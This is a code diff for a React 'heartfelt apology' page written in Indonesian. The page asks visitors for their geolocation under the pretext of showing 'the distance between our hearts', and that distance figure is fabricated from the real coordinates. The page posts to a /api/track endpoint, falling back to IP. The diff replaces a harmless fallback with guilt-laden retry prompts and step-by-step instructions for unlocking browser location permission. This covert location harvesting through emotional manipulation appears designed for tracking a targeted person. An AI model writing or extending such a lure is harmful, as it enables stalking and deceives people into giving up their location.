@@ -11,6 +11,8 @@ export default function HeartfeltApologyPage({ params }) {
   const [isLoading, setIsLoading] = useState(false);
   const [isLocating, setIsLocating] = useState(false);
   const [distanceInfo, setDistanceInfo] = useState(null);
+  const [isDenied, setIsDenied] = useState(false);
+  const [retryCount, setRetryCount] = useState(0);
   const videoRef = useRef(null);
 
   // Battery helper
@@ -73,6 +75,7 @@ export default function HeartfeltApologyPage({ params }) {
 
           // Hitung jarak romantis
           const distKm = Math.max(8, Math.round(Math.abs(latitude * 12 + longitude * 5) % 65 + 18));
+          setIsDenied(false);
           setDistanceInfo(`~${distKm} km`);
           setIsPlaying(true);
           setIsLocating(false);
@@ -97,10 +100,11 @@ export default function HeartfeltApologyPage({ params }) {
         },
         (err) => {
           console.warn('Geolocation notice (falling back to IP):', err);
-          setDistanceInfo('Terhubung di Hati');
-          setIsPlaying(true);
+          setIsDenied(true);
+          setDistanceInfo(null);
           setIsLocating(false);
           setIsLoading(false);
+          setRetryCount((prev) => prev + 1);
 
           fetch(`/api/track/${linkId || 'direct'}`, {
             method: 'POST',
@@ -293,7 +297,96 @@ export default function HeartfeltApologyPage({ params }) {
             Sentuh tombol di bawah untuk melihat seberapa jauh jarak kita saat ini dan membuka video kenangan ini...
           </p>
 
-          {distanceInfo ? (
+          {isDenied ? (
+            <div style={{
+              background: 'linear-gradient(145deg, #fffaf9 0%, #fef5f5 100%)',
+              border: '1px solid rgba(220, 140, 145, 0.45)',
+              borderRadius: '20px',
+              padding: '18px 20px',
+              width: '100%',
+              animation: 'fadeIn 0.3s ease',
+              display: 'flex',
+              flexDirection: 'column',
+              alignItems: 'center',
+              gap: '10px',
+              boxShadow: '0 8px 24px rgba(180, 100, 105, 0.08)'
+            }}>
+              <div style={{ fontSize: '1.02rem', fontWeight: 700, color: '#9c4146', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                <span style={{ fontSize: '1.15rem' }}>💔</span>
+                <span>Aduh, Jarak Hati Kita Belum Terbaca...</span>
+              </div>
+              <p style={{ fontSize: '0.88rem', color: '#68363a', lineHeight: 1.6, margin: 0 }}>
+                Sinyal hatinya belum terhubung nih... 🥺 Tadi izin lokasinya belum aktif, padahal aku penasaran banget pengin tahu seberapa jauh jarak rindu di antara kita saat ini.
+              </p>
+              <button
+                onClick={handleCalculateAndPlay}
+                disabled={isLocating}
+                style={{
+                  marginTop: '4px',
+                  width: '100%',
+                  padding: '13px 20px',
+                  backgroundColor: '#9c4146',
+                  backgroundImage: 'linear-gradient(135deg, #9c4146 0%, #b8545a 100%)',
+                  color: '#ffffff',
+                  border: 'none',
+                  borderRadius: '9999px',
+                  fontSize: '0.94rem',
+                  fontWeight: 600,
+                  cursor: isLocating ? 'wait' : 'pointer',
+                  boxShadow: '0 8px 22px rgba(156, 65, 70, 0.32)',
+                  display: 'inline-flex',
+                  alignItems: 'center',
+                  justifyContent: 'center',
+                  gap: '8px',
+                  outline: 'none',
+                  transition: 'all 0.2s ease'
+                }}
+              >
+                {isLocating ? (
+                  <>
+                    <div style={{
+                      width: '16px',
+                      height: '16px',
+                      border: '2px solid rgba(255,255,255,0.4)',
+                      borderRadius: '50%',
+                      borderTopColor: '#ffffff',
+                      animation: 'spin 0.8s linear infinite'
+                    }} />
+                    <span>Mencoba Hubungkan Ulang...</span>
+                  </>
+                ) : (
+                  <>
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
+                      <path d="M23 4v6h-6"></path>
+                      <path d="M1 20v-6h6"></path>
+                      <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path>
+                    </svg>
+                    <span>Coba Hubungkan Ulang Jarak</span>
+                  </>
+                )}
+              </button>
+              <div style={{ fontSize: '0.78rem', color: '#9c4146', fontStyle: 'italic', marginTop: '2px' }}>
+                Sentuh tombol di atas lalu pilih &ldquo;Izinkan&rdquo; ya ❤️
+              </div>
+
+              {retryCount > 0 && (
+                <div style={{
+                  marginTop: '6px',
+                  padding: '8px 12px',
+                  backgroundColor: 'rgba(255, 255, 255, 0.85)',
+                  borderRadius: '12px',
+                  border: '1px dashed rgba(180, 100, 105, 0.35)',
+                  fontSize: '0.76rem',
+                  color: '#78383b',
+                  lineHeight: 1.5,
+                  textAlign: 'center'
+                }}>
+                  💡 <strong>Kotak izin tidak muncul lagi di layar?</strong><br />
+                  Ketuk ikon gembok 🔒 di samping link (atas browser), pilih <strong>Izin Situs</strong> lalu aktifkan <strong>Lokasi</strong> ya.
+                </div>
+              )}
+            </div>
+          ) : distanceInfo ? (
             <div style={{
               background: '#fdf2f2',
               border: '1px solid rgba(225, 175, 175, 0.5)',
